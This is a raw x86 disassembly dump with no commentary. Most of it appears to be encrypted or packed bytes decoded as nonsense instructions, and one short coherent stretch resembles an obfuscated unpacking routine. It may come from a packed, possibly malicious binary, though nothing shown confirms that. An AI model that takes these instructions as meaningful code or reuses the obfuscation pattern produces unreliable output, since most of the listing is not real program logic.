  4094a7:	adc    esi,DWORD PTR [eax]
  4094a9:	outs   dx,BYTE PTR ds:[esi]
  4094aa:	mov    ebx,0x6301fb41
  4094af:	mov    ebp,eax
  4094b1:	in     eax,0x6
  4094b3:	sub    ah,BYTE PTR ds:0x88c8ae0b
  4094b9:	daa    
  4094ba:	sbb    ch,BYTE PTR [edi-0x3133f606]
  4094c0:	into   
  4094c1:	xchg   edi,eax
  4094c2:	in     eax,dx
  4094c3:	mov    bh,0x96
  4094c5:	pop    es
  4094c6:	leave  
  4094c7:	add    cl,BYTE PTR [ebx+0x2808803d]
  4094cd:	idiv   BYTE PTR [edx+0x6]
  4094d0:	mov    bh,0xe5
  4094d2:	dec    ecx
  4094d3:	cmp    al,0xdc
  4094d5:	mov    edi,0xa87c6a0c
  4094da:	and    al,0x74
  4094dc:	pop    eax
  4094dd:	cdq    
  4094de:	xor    BYTE PTR [eax+ebp*1-0x58],al
  4094e2:	mov    dh,0xef
  4094e4:	mov    BYTE PTR [ebx+eiz*1],cl
  4094e7:	dec    ecx
  4094e8:	inc    ebx
  4094e9:	inc    edx
  4094ea:	jno    0x409538
  4094ec:	xor    DWORD PTR ds:[ebp-0x43],ebx
  4094f0:	and    ecx,DWORD PTR [eax-0x4e6dc6b]
  4094f6:	mov    ecx,0xf01a2bb0
  4094fb:	jae    0x40949a
  4094fd:	push   eax
  4094fe:	sbb    DWORD PTR [edx+ebp*8],edi
  409501:	leave  
  409502:	cdq    
  409503:	push   edi
  409504:	sub    al,0x95
  409506:	retf   0xc08d
  409509:	dec    ebp
  40950a:	mov    ds:0xf021754f,al
  40950f:	dec    ecx
  409510:	add    eax,0x63931613
  409515:	and    al,0xe9
  409517:	sbb    edx,eax
  409519:	cld    
  40951a:	cmp    al,0x5
  40951c:	pushf  
  40951d:	stos   DWORD PTR es:[edi],eax
  40951e:	push   eax
  40951f:	inc    ebp
  409520:	mov    al,0x96
  409522:	sahf   
  409523:	mov    al,0xb4
  409525:	imul   ecx,DWORD PTR [ebp-0x30],0x65
  409529:	add    al,0xa3
  40952b:	addr16 ror esi,0xb3
  40952f:	jae    0x4094ea
  409531:	cwde   
  409532:	or     ebx,DWORD PTR [edi+0x6f]
  409535:	pop    esp
  409536:	jns    0x409579
  409538:	xor    al,0xba
  40953a:	sub    edx,DWORD PTR [edx+esi*1]
  40953d:	sub    BYTE PTR [ebx],al
  40953f:	xchg   ebx,eax
  409540:	aaa    
  409541:	push   cs
  409542:	adc    cl,ch
  409544:	sub    DWORD PTR [edi+0x478d41b6],0xfffffff1
  40954b:	ja     0x4094e2
  40954d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40954e:	loopne 0x409595
  409550:	dec    ebp
  409551:	adc    dh,dl
  409553:	popa   
  409554:	and    eax,0xa43acb77
  409559:	cmp    BYTE PTR [esi],0x29
  40955c:	adc    DWORD PTR [edi],esi
  40955e:	mov    edi,0xba898aa1
  409563:	mov    ah,0x19
  409565:	push   edi
  409566:	nop
  409567:	pop    eax
  409568:	and    al,BYTE PTR [edi-0x44]
  40956b:	pop    ebp
  40956c:	int3   
  40956d:	jg     0x4095a4
  40956f:	(bad)  
  409572:	pop    esi
  409573:	inc    edx
  409574:	out    0xe1,eax
  409576:	loope  0x409540
  409578:	ds push ebx
  40957a:	pop    eax
  40957b:	fistp  QWORD PTR [ebx]
  40957d:	xchg   ecx,eax
  40957e:	inc    esp
  40957f:	jbe    0x4095d2
  409581:	mov    eax,0x67893554
  409586:	push   cs
  409587:	and    eax,0x42848cb6
  40958c:	ss aas 
  40958e:	jae    0x409576
  409590:	add    eax,0xa5676b9d
  409595:	adc    eax,0x8be0e128
  40959a:	sti    
  40959b:	jno    0x409579
  40959d:	jbe    0x4095a4
  40959f:	test   eax,0xf9ae760c
  4095a4:	adc    cl,0x3c
  4095a7:	pop    ebp
  4095a8:	and    BYTE PTR [esi],al
  4095aa:	or     al,0xf7
  4095ac:	aas    
  4095ad:	xchg   ecx,eax
  4095ae:	xchg   esi,eax
  4095af:	in     eax,dx
  4095b0:	inc    eax
  4095b1:	lods   eax,DWORD PTR cs:[esi]
  4095b3:	or     al,0xc
  4095b5:	push   eax
  4095b6:	jp     0x409546
  4095b8:	cdq    
  4095b9:	adc    bl,al
  4095bb:	iret   
  4095bc:	ss ss pop edi
  4095bf:	cmp    dl,0x4f
  4095c2:	sbb    al,0xa5
  4095c4:	cmp    DWORD PTR [ebp-0x3ca80bd7],0x1da795a7
  4095ce:	pusha  
  4095cf:	adc    al,0x96
  4095d1:	pop    edi
  4095d2:	es fwait
  4095d4:	fwait
  4095d5:	mov    bl,dh
  4095d7:	mov    ds:0x2db9d4c8,al
  4095dc:	retf   0x6530
  4095df:	inc    eax
  4095e0:	sbb    al,0x81
  4095e2:	mov    al,0x57
  4095e4:	enter  0x38af,0x9b
  4095e8:	addr16 jmp 0xe9ff:0xffd520e8
  4095f0:	inc    edx
  4095f1:	add    al,BYTE PTR [eax]
  4095f3:	add    cl,ah
  4095f5:	xchg   esi,eax
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ef4:0xa05794e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	pop    ebx
  40960d:	in     eax,0x38
  40960f:	mov    ss,WORD PTR [bp+0x5f16]
  409614:	sbb    al,BYTE PTR [edx]
  409616:	scas   eax,DWORD PTR es:[edi]
  409617:	sar    dh,1
  409619:	pop    esp
  40961a:	loope  0x4095c3
  40961c:	sub    al,0xa
  40961e:	jb     0x40961a
  409620:	stc    
  409621:	mov    fs,WORD PTR ss:[ebx+eiz*4+0x6a]
  409626:	mov    bl,0xb5
  409628:	sub    edi,0x3d
  40962b:	es push es
  40962d:	xchg   ebp,eax
  40962e:	shl    eax,0xdd
  409631:	or     BYTE PTR [eax+0x6e],ah
  409634:	gs jecxz 0x40966e
  409637:	pop    ebx
  409638:	shr    BYTE PTR [esi],1
  40963a:	(bad)  
  40963b:	sub    al,0xc4
  40963d:	inc    esi
  40963e:	in     eax,dx
  40963f:	dec    esi
  409640:	jnp    0x409685
  409642:	jbe    0x40969e
  409644:	jecxz  0x4095ed
  409646:	shl    BYTE PTR [eax+0x618f8195],1
  40964c:	fwait
  40964d:	xchg   edx,eax
  40964e:	or     DWORD PTR [edi+0x3add7cf1],0xfa514b5
  409658:	add    eax,0x1b184b12
  40965d:	aam    0x5c
  40965f:	xor    cl,dl
  409661:	fnstcw WORD PTR [edx]
  409663:	dec    ecx
  409664:	and    esi,esi
  409666:	inc    ebp
  409667:	jmp    0xc515:0xc3f1ed11
  40966e:	sbb    al,0x73
  409670:	sbb    eax,0xcdd71462
  409675:	jecxz  0x409672
  409677:	and    edi,esp
  409679:	pop    ebp
  40967a:	xor    dl,BYTE PTR [eax+edx*2-0x3c9f891c]
  409681:	pop    ecx
  409682:	arpl   WORD PTR [esp+eax*4-0x54],si
  409686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409687:	cs jp  0x4096a8
  40968a:	pop    ecx
  40968b:	add    DWORD PTR [edx],eax
  40968d:	dec    ebp
  40968e:	fs popf 
  409690:	sar    bh,0x42
  409693:	lods   al,BYTE PTR ds:[esi]
  409694:	in     al,dx
  409695:	mov    ah,0xb4
  409697:	push   cs
  409698:	and    al,0x75
  40969a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40969b:	jno    0x409651
  40969d:	test   al,0xfb
  40969f:	mov    BYTE PTR [ebp+0x17],0xd8
  4096a3:	jg     0x4096cc
  4096a5:	sbb    al,0x43
  4096a7:	imul   ecx,DWORD PTR [esi-0x38],0x48
  4096ab:	aas    
  4096ac:	(bad)  
  4096ad:	(bad)  
  4096af:	lea    eax,[edx+0x29]
  4096b2:	mov    gs,WORD PTR [eax+0x38]
  4096b5:	inc    ebp
  4096b6:	adc    DWORD PTR [ebx+0x60],edi
  4096b9:	fmul   DWORD PTR [ebp-0x25]
  4096bc:	(bad)  
  4096bd:	xor    DWORD PTR [edx+0x6810d981],ecx
  4096c3:	mov    ds:0xaec7e494,al
  4096c8:	mov    WORD PTR [eax],fs
  4096ca:	inc    BYTE PTR [esi+0x68954035]
  4096d0:	les    ebx,FWORD PTR [ebx]
  4096d2:	and    eax,0x88ba2c2a
  4096d7:	cmp    eax,DWORD PTR [ecx-0x17]
  4096da:	mov    ah,0xe8
  4096dc:	push   esp
  4096dd:	popa   
  4096de:	lock sbb al,bl
  4096e1:	arpl   WORD PTR [esi+0x40],bx
  4096e4:	inc    ebx
  4096e5:	shr    BYTE PTR [edi-0x5c],0xf1
  4096e9:	pop    ebp
  4096ea:	push   ebp
  4096eb:	sbb    BYTE PTR [edi-0x41ac429d],dl
  4096f1:	imul   ebp,DWORD PTR [eax-0x16],0xdc29376
  4096f8:	mov    ch,0x96
  4096fa:	mov    ds:0x90ee7aa8,al
  4096ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409700:	not    al
  409702:	or     BYTE PTR [eax+0x211f862e],bl
  409708:	in     eax,0x44
  40970a:	cmp    dh,BYTE PTR [ecx+ebp*8]
  40970d:	push   0x43
  40970f:	mov    ah,0xf0
  409711:	xchg   ecx,eax
  409712:	(bad)  
  409713:	ss pop ebp
  409715:	dec    ecx
  409716:	jbe    0x4096d5
  409718:	push   esp
  409719:	xchg   edi,eax
  40971a:	bound  esi,QWORD PTR [eax+0x1226859]
  409720:	pop    esi
  409721:	add    bh,ch
  409723:	jp     0x409756
  409725:	ror    DWORD PTR [edx+0xe],0x97
  409729:	scas   eax,DWORD PTR es:[edi]
  40972a:	cmp    bl,BYTE PTR [edx+0x11ee606e]
  409730:	in     eax,0x95
  409732:	sub    eax,0x816e6285
  409737:	pop    es
  409738:	fcomip st,st(4)
  40973a:	adc    eax,0xaee8fae4
  40973f:	das    
  409740:	jmp    0x3e3f:0xf320cd0f
  409747:	mov    ebx,DWORD PTR [edi+0x2e]
  40974a:	outs   dx,DWORD PTR ds:[esi]
  40974b:	and    DWORD PTR [edx],ebp
  40974d:	out    dx,eax
  40974e:	fsubr  DWORD PTR [edi-0x13]
  409751:	fwait
  409752:	pop    es
  409753:	popf   
  409754:	jp     0x4096d6
  409756:	outs   dx,BYTE PTR ds:[esi]
  409757:	xchg   ecx,eax
  409758:	pop    edi
  409759:	jle    0x4096e8
  40975b:	mov    esp,0x9e764173
  409760:	adc    al,0x87
  409762:	mov    bl,BYTE PTR [ebx+eax*4+0x1691d033]
  409769:	dec    ebp
  40976a:	jl     0x409703
  40976c:	xor    al,BYTE PTR [eax]
  40976e:	mov    dl,0xe1
  409770:	xchg   BYTE PTR [ecx],bh
  409772:	lock push esp
  409774:	into   
  409775:	mov    DWORD PTR [ebx+eiz*2+0x60],edi
  409779:	inc    eax
  40977a:	mov    edx,0x4c338591
  40977f:	mov    ebx,0xf4320383
  409784:	dec    edi
  409785:	mov    eax,0x62017b81
  40978a:	push   ebx
  40978b:	sbb    DWORD PTR [edx],edx
  40978d:	fistp  DWORD PTR [ebp+0x24]
  409790:	xchg   ebx,eax
  409791:	or     al,0x14
  409793:	sub    cl,BYTE PTR [ebx-0x7bbfd36c]
  409799:	out    dx,eax
  40979a:	sub    al,0x30
  40979c:	popa   
  40979d:	popa   
  40979e:	push   esi
  40979f:	mov    bl,cl
  4097a1:	(bad)  
  4097a2:	retf   
  4097a3:	je     0x4097f9
  4097a5:	into   
  4097a6:	retf   0x9b5b
  4097a9:	pop    ss
  4097aa:	imul   ebx,DWORD PTR [ebx+edi*1-0x340daa1c],0x73618f68
  4097b5:	mov    dl,0x33
  4097b7:	call   0x92e7:0xb39b750c
  4097be:	cwde   
  4097bf:	push   ecx
  4097c0:	imul   ebp,DWORD PTR [ecx+0x53ebe74b],0x5f
  4097c7:	in     eax,dx
  4097c8:	scas   eax,DWORD PTR es:[edi]
  4097c9:	cmp    dh,ch
  4097cb:	dec    eax
  4097cc:	mov    bl,0xb2
  4097ce:	pop    es
  4097cf:	inc    ebx
  4097d0:	dec    ebx
  4097d1:	dec    esi
  4097d2:	jmp    0x4097e0
  4097d4:	mov    ah,0x28
  4097d6:	test   DWORD PTR [esi],0xbebc0b2
  4097dc:	cwde   
  4097dd:	sbb    al,BYTE PTR [esi]
  4097df:	cs mov ch,0x1c
  4097e2:	inc    esp
  4097e3:	jb     0x4097fb
  4097e5:	iret   
  4097e6:	fidivr DWORD PTR ds:0x25770fe5
  4097ec:	cmp    eax,0xf0c59b0f
  4097f1:	xchg   ecx,eax
  4097f2:	push   eax
  4097f3:	fisttp WORD PTR [ecx+0x393f9515]
  4097f9:	dec    ebx
  4097fa:	or     BYTE PTR [edx-0x45],0xa8
  4097fe:	lds    ecx,FWORD PTR [eax+ecx*2+0x3ba22234]
  409805:	xchg   edi,eax
  409806:	cdq    
  409807:	add    al,0x36
  409809:	xchg   ecx,eax
  40980a:	mov    dl,0x18
  40980c:	jbe    0x4097c7
  40980e:	fiadd  DWORD PTR [esi+ebp*1+0x707ebde0]
  409815:	dec    BYTE PTR [edx+eax*4]
  409818:	aas    
  409819:	repz (bad) 
  40981b:	mov    eax,0xc5c3f9ce
  409820:	jmp    0x4097cb
  409822:	call   0x5546:0x70a077ca
  409829:	std    
  40982a:	cmp    edx,DWORD PTR [eax+0x5e084ed4]
  409830:	jmp    0x4098a2
  409832:	push   edx
  409833:	fwait
  409834:	(bad)  
  409835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	dec    ebp
  4098c1:	xchg   esi,eax
  4098c2:	add    eax,0x7ed9b48c
  4098c7:	jle    0x409901
  4098c9:	jl     0x409949
  4098cb:	jle    0x4098d4
  4098cd:	push   ebx
  4098ce:	mov    edx,esp
  4098d0:	cwde   
  4098d1:	std    
  4098d2:	and    BYTE PTR [edi+esi*8-0xb1f1014],ah
  4098d9:	clc    
  4098da:	icebp  
  4098db:	cmp    eax,0x42c49223
  4098e0:	(bad)  
  4098e1:	jmp    0x4098f2
  4098e3:	pushf  
  4098e4:	mov    esp,0xdc1c82b4
  4098e9:	into   
  4098ea:	test   ax,0x8e7d
  4098ee:	inc    ebp
  4098ef:	ja     0x409965
  4098f1:	add    dl,bh
  4098f3:	mov    bl,0x13
  4098f5:	jbe    0x409965
  4098f7:	inc    esi
  4098f8:	(bad)  
  4098f9:	push   edi
  4098fa:	loop   0x4098c5
  4098fc:	inc    ebx
  4098fd:	push   edx
  4098fe:	repz or eax,0xa0899cb9
  409904:	outs   dx,BYTE PTR ds:[esi]
  409905:	popf   
  409906:	rep stos DWORD PTR es:[edi],eax
  409908:	(bad)  
  40990a:	inc    esp
  40990b:	mov    bl,0x5f
  40990d:	mov    al,ds:0xf6662139
  409912:	in     al,dx
  409913:	fs scas al,BYTE PTR es:[edi]
  409915:	test   eax,0x246ff2e2
  40991a:	jge    0x40997f
  40991c:	and    al,bl
  40991e:	or     ecx,edx
  409920:	xlat   BYTE PTR ds:[ebx]
  409921:	pop    esp
  409922:	cmp    BYTE PTR [edx],ah
  409924:	test   dl,ah
  409926:	call   0x9cd1fc82
  40992b:	repz sahf 
  40992d:	push   0x6200d418
  409932:	js     0x409932
  409934:	jns    0x409917
  409936:	into   
  409937:	xor    dh,BYTE PTR [edi+0x7f84291d]
  40993d:	mov    ecx,0x224b122
  409942:	xor    ah,dl
  409944:	push   edx
  409945:	push   eax
  409946:	cld    
  409947:	mov    ch,0x8
  409949:	retf   0x6f78
  40994c:	xchg   esp,eax
  40994d:	add    BYTE PTR [ebp-0x7b81210b],cl
  409953:	cli    
  409954:	jne    0x409974
  409956:	mov    ch,BYTE PTR ds:0x2e9909bb
  40995c:	imul   edi,esi,0x5ea02ea5
  409962:	fmul   st(0),st
  409964:	mov    esp,0xc5d65967
  409969:	xchg   ecx,eax
  40996a:	mov    eax,0x3a2ff8d0
  40996f:	clc    
  409970:	sub    al,0x28
  409972:	jmp    0x40997f
  409974:	xor    ah,0xb5
  409977:	stc    
  409978:	xchg   ecx,eax
  409979:	sar    esi,1
  40997b:	inc    esi
  40997c:	jnp    0x4099f5
  40997e:	sub    BYTE PTR [eax-0x57],ah
  409981:	sbb    BYTE PTR [eax-0x78f5a73e],0x89
  409988:	add    BYTE PTR [ecx+0x46747151],0xa8
  40998f:	xor    BYTE PTR [edi+0xe1bbf44],ah
  409995:	ja     0x4099f5
  409997:	xchg   DWORD PTR [edx-0x2ca1464b],esp
  40999d:	call   0x8b20:0x1174a71
  4099a4:	mov    edx,0x9778c312
  4099a9:	(bad)  
  4099aa:	icebp  
  4099ab:	lock pop eax
  4099ad:	dec    esi
  4099ae:	std    
  4099af:	mov    edi,0xb70a2f61
  4099b4:	pop    eax
  4099b5:	cmp    bl,BYTE PTR [ebx+0x125c990]
  4099bb:	(bad)  
  4099bc:	enter  0xc516,0x41
  4099c0:	or     al,0x7f
  4099c2:	mov    edi,0xef678db4
  4099c7:	push   0xffffffca
  4099c9:	sbb    edx,DWORD PTR [ecx-0x10dd898]
  4099cf:	lods   eax,DWORD PTR ds:[esi]
  4099d0:	sub    al,0x4a
  4099d2:	push   ds
  4099d3:	mov    edi,0x389405fe
  4099d8:	fistp  QWORD PTR [edx]
  4099da:	sub    al,0x38
  4099dc:	pop    ebp
  4099dd:	out    0xd7,eax
  4099df:	push   esi
  4099e0:	add    WORD PTR [ebx],0xb27a
  4099e5:	pop    ds
  4099e6:	loopne 0x409a17
  4099e8:	imul   edx,DWORD PTR [ebx],0x7b
  4099eb:	rol    BYTE PTR [ebp-0x27],1
  4099ee:	sub    edx,DWORD PTR [ecx-0x4d]
  4099f1:	dec    ecx
  4099f2:	push   ss
  4099f3:	ud2    
  4099f5:	inc    eax
  4099f6:	cs push 0xffffffae
  4099f9:	jbe    0x409a47
  4099fb:	mov    esp,0xc5446e9b
  409a00:	pop    esi
  409a01:	test   DWORD PTR [eax-0x9],esi
  409a04:	popa   
  409a05:	(bad)  
  409a06:	aas    
  409a07:	ret    
  409a08:	sub    eax,0x43d5484
  409a0d:	xchg   ebx,eax
  409a0e:	fdivr  QWORD PTR [ecx-0x73a2bbab]
  409a14:	jmp    0x820:0xf37bce98
  409a1b:	out    dx,al
  409a1c:	aad    0x4
  409a1e:	and    bl,BYTE PTR [ebx+0x1a]
  409a21:	into   
  409a22:	mov    esi,0xa75b93ba
  409a27:	xchg   esp,eax
  409a28:	imul   edi,DWORD PTR [ecx-0x75],0x51840dbe
  409a2f:	xchg   DWORD PTR [ecx],ecx
  409a31:	push   DWORD PTR [ebp-0x1e997565]
  409a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a38:	dec    ebx
  409a39:	fisttp WORD PTR [edx+ebx*8-0x30]
  409a3d:	mul    ah
  409a3f:	dec    ecx
  409a40:	retf   
  409a41:	jnp    0x409a9e
  409a43:	(bad)  
  409a44:	cli    
  409a45:	xor    ecx,DWORD PTR [ebp+0x55]
  409a48:	lds    ebp,FWORD PTR [eax+0x5]
  409a4b:	cmp    cl,bl
  409a4d:	adc    eax,0x90175bad
  409a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a53:	or     dh,dl
  409a55:	jecxz  0x409a3d
  409a57:	add    eax,0xff3760bd
  409a5c:	mov    dh,0xeb
  409a5e:	adc    al,0x94
  409a60:	hlt    
  409a61:	sar    BYTE PTR [edx],0xe5
  409a64:	mov    bh,0x1f
  409a66:	inc    eax
  409a67:	xchg   edx,eax
  409a68:	mov    al,0x4b
  409a6a:	fmul   st,st(1)
  409a6c:	fucomi st,st(7)
  409a6e:	aas    
  409a6f:	inc    eax
  409a70:	xor    BYTE PTR [esi-0x56],ah
  409a73:	sbb    eax,0xe1548531
  409a78:	and    edi,DWORD PTR [esi-0x3d]
  409a7b:	jnp    0x409a8f
  409a7d:	xor    esi,esi
  409a7f:	pop    esi
  409a80:	cmp    edx,esp
  409a82:	mov    al,ds:0x48eb9bcb
  409a87:	rcl    DWORD PTR [ebx+0x4e2db0e8],0xf3
  409a8e:	sahf   
  409a8f:	and    BYTE PTR [edx+0x62],dh
  409a92:	inc    ecx
  409a93:	leave  
  409a94:	push   0xffffffe4
  409a96:	dec    ecx
  409a97:	lock stos BYTE PTR es:[edi],al
  409a99:	sti    
  409a9a:	dec    esp
  409a9b:	(bad)  
  409a9c:	icebp  
  409a9d:	iret   
  409a9e:	repz cld 
  409aa0:	cmp    al,0x59
  409aa2:	out    0xac,al
  409aa4:	daa    
  409aa5:	mov    al,0xf3
  409aa7:	jmp    0x57c8d6be
  409aac:	xchg   ebp,eax
  409aad:	stos   DWORD PTR es:[edi],eax
  409aae:	xor    BYTE PTR [eax+0x4d],ch
  409ab1:	xchg   edi,eax
  409ab2:	xor    cl,dh
  409ab4:	aad    0x76
  409ab6:	fisub  DWORD PTR [edi]
  409ab8:	pop    esp
  409ab9:	dec    esp
  409aba:	ja     0x409b2b
  409abc:	mul    al
  409abe:	xor    eax,0x572cf24d
  409ac3:	push   ss
  409ac4:	sbb    DWORD PTR [esi-0x7a],0xec28940c
  409acb:	gs dec edi
  409acd:	inc    ebx
  409ace:	les    ecx,FWORD PTR [edx+0x595a1432]
  409ad4:	cmp    esi,DWORD PTR [ebx-0xf2e2922]
  409ada:	js     0x409afe
  409adc:	in     eax,dx
  409add:	inc    eax
  409ade:	adc    ch,BYTE PTR [ecx+0x7e]
  409ae1:	ss dec ebp
  409ae3:	loope  0x409b0b
  409ae5:	ret    0x4c98
  409ae8:	xor    eax,0xafec4d01
  409aed:	cli    
  409aee:	xchg   esi,eax
  409aef:	or     DWORD PTR [ecx],eax
  409af1:	adc    ch,BYTE PTR [edx-0x7c349ef5]
  409af7:	xchg   edx,eax
  409af8:	jmp    0x409a98
  409afa:	mov    ah,0xab
  409afc:	and    edx,esp
  409afe:	fnsave [eax]
  409b00:	call   0xc3b:0x7291370d
  409b07:	call   0x32e9:0x6bded99f
  409b0e:	xor    eax,edi
  409b10:	push   0x81575636
  409b15:	sbb    eax,0x43369f
  409b1a:	push   ebx
  409b1b:	ss inc ebx
  409b1d:	add    cl,ch
  409b1f:	pop    esi
  409b20:	add    al,BYTE PTR [eax]
  409b22:	add    ch,al
  409b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b25:	lods   al,BYTE PTR ds:[esi]
  409b26:	shr    BYTE PTR [ecx+edx*8+0x61],cl
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x498291d4]
  409b32:	test   BYTE PTR [esi-0x1c],bh
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	aam    0xd0
  409b3d:	popf   
  409b3e:	lods   eax,DWORD PTR fs:[esi]
  409b40:	lahf   
  409b41:	jmp    0x409b5f
  409b43:	jo     0x409b03
  409b45:	nop
  409b46:	xor    cl,BYTE PTR [ecx-0x417b6cd5]
  409b4c:	aas    
  409b4d:	xchg   ebx,eax
  409b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b4f:	pop    edi
  409b50:	add    DWORD PTR [edi+edi*4-0x1aa85d0f],edx
  409b57:	cdq    
  409b58:	xchg   ebp,eax
  409b59:	pop    ebx
  409b5a:	in     eax,0xbd
  409b5c:	jl     0x409b7b
  409b5e:	pop    esi
  409b5f:	xlat   BYTE PTR ds:[ebx]
  409b60:	xchg   ebp,eax
  409b61:	dec    eax
  409b62:	ins    DWORD PTR es:[edi],dx
  409b63:	cmp    ecx,DWORD PTR [ebx+0x22]
  409b66:	mov    al,ds:0xbf179a7b
  409b6b:	(bad)  
  409b6c:	test   ebp,0xef2d99e9
  409b72:	pop    ss
  409b73:	adc    ebx,DWORD PTR [ebp-0x42]
  409b76:	push   0xd301d1a6
  409b7b:	jecxz  0x409b08
  409b7d:	jg     0x409baa
  409b7f:	mov    ch,0x79
  409b81:	xchg   ecx,eax
  409b82:	aam    0x1d
  409b84:	pop    edx
  409b85:	mov    ch,0x74
  409b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b88:	sub    eax,ebx
  409b8a:	inc    edi
  409b8b:	and    BYTE PTR [edx+0x6a92b2e8],ch
  409b91:	inc    eax
  409b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b93:	lods   eax,DWORD PTR ds:[esi]
  409b94:	ins    DWORD PTR es:[edi],dx
  409b95:	loopne 0x409bbe
  409b97:	sub    BYTE PTR [edx-0x54],0xd4
  409b9b:	cmp    DWORD PTR [esi+0xd],ecx
  409b9e:	fbstp  TBYTE PTR [edx+0x80a0db6]
  409ba4:	fimul  WORD PTR [esi]
  409ba6:	push   edx
  409ba7:	mov    ebx,0xa29c9026
  409bac:	int3   
  409bad:	in     al,0x44
  409baf:	outs   dx,BYTE PTR ds:[esi]
  409bb0:	fwait
  409bb1:	mov    edi,0xe19ba615
  409bb6:	pop    ebp
  409bb7:	and    eax,0xd9725c79
  409bbc:	adc    BYTE PTR [edx],ah
  409bbe:	out    0x95,al
  409bc0:	inc    esi
  409bc1:	xchg   esi,eax
  409bc2:	(bad)  
  409bc3:	jbe    0x409c40
  409bc5:	or     eax,0xf85b9196
  409bca:	push   cs
  409bcb:	mov    ds:0x46aff9ad,al
  409bd0:	in     eax,dx
  409bd1:	fiadd  DWORD PTR [esi-0x2e031879]
  409bd7:	inc    ebp
  409bd8:	mov    ah,0x6f
  409bda:	aam    0xba
  409bdc:	ror    BYTE PTR [esi+0x2dc4afb0],0x45
  409be3:	jge    0x409bf3
  409be5:	scas   eax,DWORD PTR es:[edi]
  409be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be7:	out    dx,al
  409be8:	push   esp
  409be9:	fist   DWORD PTR [edi*8-0x5840c245]
  409bf0:	push   ebx
  409bf1:	sbb    eax,0xa8792f9f
  409bf6:	cdq    
  409bf7:	cwde   
  409bf8:	or     al,0xb2
  409bfa:	ins    DWORD PTR es:[edi],dx
  409bfb:	jne    0x409bb4
  409bfd:	das    
  409bfe:	and    edx,eax
  409c00:	push   ebp
  409c01:	jge    0x409b8d
  409c03:	inc    edi
  409c04:	lods   eax,DWORD PTR ds:[esi]
  409c05:	xor    DWORD PTR [esi],ebp
  409c07:	push   0x75
  409c09:	fwait
  409c0a:	jbe    0x409ba4
  409c0c:	nop
  409c0d:	dec    edx
  409c0e:	arpl   WORD PTR [edi],bp
  409c10:	mov    edi,0xd483f6a8
  409c15:	cmp    eax,0x68d6eeca
  409c1a:	out    dx,eax
  409c1b:	cs xchg esp,eax
  409c1d:	ins    DWORD PTR es:[edi],dx
  409c1e:	add    cl,BYTE PTR [ecx+ebx*1+0xd65f72e]
  409c25:	cmp    ch,BYTE PTR [edi]
  409c27:	ret    0x7d77
  409c2a:	cs stos BYTE PTR es:[edi],al
  409c2c:	retf   0x8845
  409c2f:	out    0x11,al
  409c31:	sbb    edi,eax
  409c33:	or     BYTE PTR [edi+0x3d],0xc
  409c37:	scas   eax,DWORD PTR es:[edi]
  409c38:	je     0x409c89
  409c3a:	jb     0x409c7f
  409c3c:	outs   dx,DWORD PTR ds:[esi]
  409c3d:	arpl   WORD PTR [edi+ebx*1-0x57b22df],sp
  409c44:	inc    eax
  409c45:	cdq    
  409c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c47:	sbb    eax,0x43ace8af
  409c4c:	(bad)  
  409c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c4e:	mov    dh,0x6f
  409c50:	mov    BYTE PTR [ebx],al
  409c52:	call   0x81a1:0xf3235d24
  409c59:	daa    
  409c5a:	cmp    DWORD PTR [ebx+0x56d51d26],edx
  409c60:	push   0x24fbe736
  409c65:	fadd   QWORD PTR [ecx+0x62bdf3ae]
  409c6b:	jo     0x409c6d
  409c6d:	mov    ds:0xcafc8279,eax
  409c72:	and    BYTE PTR [edx+edi*4-0x6f5a16e1],al
  409c79:	adc    BYTE PTR [bp+si-0x1a],ch
  409c7d:	xchg   esp,eax
  409c7e:	jl     0x409cca
  409c80:	push   esi
  409c81:	xchg   ebx,eax
  409c82:	push   ds
  409c83:	jl     0x409cfb
